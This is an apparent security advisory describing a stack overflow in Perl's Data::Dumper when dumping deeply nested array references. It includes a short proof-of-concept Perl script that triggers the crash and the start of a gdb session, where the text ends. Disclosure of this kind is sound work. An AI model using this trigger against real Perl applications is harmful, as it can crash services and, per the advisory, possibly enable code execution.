Depending on context code execution on some architectures might be possible if certain conditions are met.   Issue Description ================= During internal development a stack overflow was discovered when serializing data via the Data::Dumper extension which is part of Perl-Core. By using the "Dumper" method on a large Array-Reference which recursively contains other Array-References, it is possible to cause many recursive calls to the DD_dump native function and ultimately exhaust all available stack memory.   Temporary Workaround and Fix ============================ Applications written in Perl should ensure that a sanity check on data serialized by Data::Dumper is performed.  According to the vendor a patch is available and coordinated with downstream vendors.   Proof of Concept ================ $ cat min.pl use strict; use Data::Dumper;  my $dumpme = []; for (my $i = 0; $i < $ARGV[0]; $i++) { 	$dumpme = [$dumpme, "AAAAAAAA"]; } print Dumper($dumpme);  $ gdb --args perl min.pl GNU gdb (GDB) Copyright (C) Free Software Foundation, Inc.
